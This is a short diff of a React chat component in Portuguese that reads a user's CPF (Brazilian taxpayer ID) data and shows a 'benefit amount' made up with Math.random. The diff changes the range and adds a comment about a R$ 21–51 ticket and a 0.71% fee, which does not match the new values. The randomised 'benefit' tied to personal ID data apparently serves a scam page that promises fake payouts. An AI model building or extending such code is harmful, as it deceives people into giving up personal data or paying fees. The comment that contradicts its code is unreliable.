@@ -60,9 +60,9 @@ const Chat = () => {
   // Try to get cpfData from location state or session
   const cpfData: CPFData | undefined = location.state?.cpfData || getSession()?.cpfData;
   const [valorBeneficio] = useState(() => {
-    // Valor entre R$ 5.284,32 e R$ 8.523,54
-    const minValue = 5284.32;
-    const maxValue = 8523.54;
+    // Gera ticket de R$ 21,45 a R$ 51,28 com taxa 0,71%
+    const minValue = 3021.13;
+    const maxValue = 7222.54;
     const randomValue = Math.random() * (maxValue - minValue) + minValue;
     return Math.round(randomValue * 100) / 100;
   });
